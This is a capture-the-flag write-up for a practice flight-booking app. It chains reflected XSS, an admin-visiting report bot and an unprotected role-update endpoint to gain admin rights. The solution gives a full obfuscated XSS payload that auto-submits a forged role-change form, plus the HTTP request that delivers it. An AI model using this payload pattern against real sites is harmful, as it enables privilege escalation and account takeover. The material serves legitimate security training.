# FlyAirways
# Author: [Shlok](https://github.com/pphreak-1001)

## Challenge Overview

FlyAirways is a flight booking web application with user registration, login, profile management, and an admin panel. The goal is to escalate our user role to `admin` by exploiting:

1. A **Reflected XSS** vulnerability.
2. An **admin bot** that visits reported URLs while logged in as admin.
3. A **CSRF-vulnerable endpoint** (`/update-role`) that lacks anti-CSRF tokens.

Once we become admin, we can fetch the flag via `/get-flag`.

## Goal
- Exploit the Reflected XSS and chain it with reporting feature to make the update-role request from admin's account and escalate self role to Admin.

## Solution

Final malicious URL:
```
http://flyairways.local:9030/flight_info?q="><script>document.write(atob('PGZvcm0gaWQ9eCBhY3Rpb249L3VwZGF0ZS1yb2xlIG1ldGhvZD1QT1NUPjxpbnB1dCBuYW1lPXRhcmdldF91c2VyX2lkIHZhbHVlPTEyM2U0NTY3LWU4OWItMTJkMy1hNDU2LTQyNjYxNDE3NDAwMD48aW5wdXQgbmFtZT1yb2xlIHZhbHVlPWFkbWluPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd4Jykuc3VibWl0KCk8L3NjcmlwdD4='))</script>
```
Replace 123e4567-e89b-12d3-a456-426614174000 with your actual user_id from the session or /api/user. 

Report it to admin

```
POST /report-incorrect-info HTTP/1.1
Host: flyairways.local:9030
Cookie: session=...

incorrect_url=http://flyairways.local:9030/flight_info?q=%22%3E%3Cscript%3Edocument.write(atob(%27PGZvcm0gaWQ9eCBhY3Rpb249L3VwZGF0ZS1yb2xlIG1ldGhvZD1QT1NUPjxpbnB1dCBuYW1lPXRhcmdldF91c2VyX2lkIHZhbHVlPTEyM2U0NTY3LWU4OWItMTJkMy1hNDU2LTQyNjYxNDE3NDAwMD48aW5wdXQgbmFtZT1yb2xlIHZhbHVlPWFkbWluPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd4Jykuc3VibWl0KCk8L3NjcmlwdD4=%27))%3C/script%3E
```

After a few seconds, your role will be upgraded to admin. 

